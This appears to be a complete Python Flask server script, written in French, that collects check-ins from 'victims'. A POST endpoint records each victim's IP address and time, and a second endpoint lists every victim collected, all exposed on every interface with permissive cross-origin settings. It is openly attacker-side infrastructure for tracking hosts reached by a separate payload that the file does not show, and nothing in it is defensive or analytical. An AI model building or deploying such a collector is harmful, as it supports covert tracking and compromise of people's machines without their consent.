from flask import Flask, request, jsonify  
from flask_cors import CORS  
  
app = Flask(__name__)  
CORS(app)  
  
victimes = []  
  
@app.route('/')  
def home():  
    return "Serveur actif !"  
  
@app.route('/je-suis-la', methods=['POST'])  
def nouvelle_victime():  
    donnees = request.get_json()  
      
    nouvelle = {  
        'ip': donnees.get('ip'),  
        'heure': donnees.get('heure'),  
        'id': len(victimes) + 1  
    }  
    victimes.append(nouvelle)  
      
    print(f"[+] Victime {nouvelle['id']} - IP: {nouvelle['ip']}")  
    return {'ok': True}  
  
@app.route('/liste-victimes', methods=['GET'])  
def voir_victimes():  
    return jsonify(victimes)  
  
if __name__ == '__main__':  
    app.run(host='0.0.0.0', port=5000)  